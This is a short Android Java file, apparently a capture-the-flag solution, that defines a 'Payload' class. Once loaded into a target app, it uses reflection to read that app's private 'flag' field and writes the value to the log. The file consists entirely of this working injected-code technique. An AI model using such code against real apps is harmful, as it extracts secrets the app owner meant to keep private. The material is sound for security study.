package com.mobisec.fortnitepayload;

import android.util.Log;

import java.lang.reflect.Field;

public class Payload {
    public static void run(){
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class<?> clas = classLoader.loadClass("com.mobisec.fortnite.MainActivity");
            Field field = clas.getDeclaredField("flag");
            field.setAccessible(true);
            Object value = field.get(clas);
            Log.i("MOBISEC", value.toString());

        } catch (Exception e) {
            Log.i("MOBISEC", e.toString());
        }
    }
}
